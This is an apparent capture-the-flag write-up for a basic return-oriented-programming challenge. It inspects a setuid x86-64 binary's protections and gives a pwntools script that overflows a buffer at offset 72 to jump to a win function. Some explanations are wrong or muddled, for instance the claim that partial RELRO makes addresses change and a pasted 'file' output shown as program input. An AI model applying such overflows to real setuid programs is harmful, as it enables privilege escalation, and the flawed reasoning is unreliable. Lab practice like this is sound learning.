# ROP

1.0
Running file, this is the information we get: `setuid ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=d8139021537155e37001bee6c246dc903124f45c, for GNU/Linux 3.2.0, not stripped`
The setuid should be able to allow u to escalate our privileges when we execute certain code within the binary. It is also important to note it is x86-64 as this determines how many bytes are required to overwrite the RIP; 8. (since it is 64 bit).
We are given the return address: 0x7ffd9ad57f78 
And offset: 72
win function address: 0x401d8e
This exponentially reduces the difficulty.

Entering `setuid ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=d8139021537155e37001bee6c246dc903124f45c, for GNU/Linux 3.2.0, not stripped` confirms we have overwritten the RIP based on the output of the programme.
Checking which checks are in place"
```sh
Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
    SHSTK:    Enabled
    IBT:      Enabled
```
    the partial RELRO means the address will differ each time. Thus, we need to be able to retrieve this and use it when exploiting. However, the win function does not change, and since we are given the offset it is not needed in this scenario.


PoC code which gave ROP gadgets for the practice:
```python
from pwn import *

binary = ELF("/challenge/babyrop_level1.0")
p = binary.process()

offset = 72
payload = b"A"*offset
payload += b"\x8e\x1d\x40\x00\x00\x00\x00\x00"

print(p.recvuntil(b"address).\n"))
p.sendline(payload)
print(p.recvall())
```

And we got the flag.



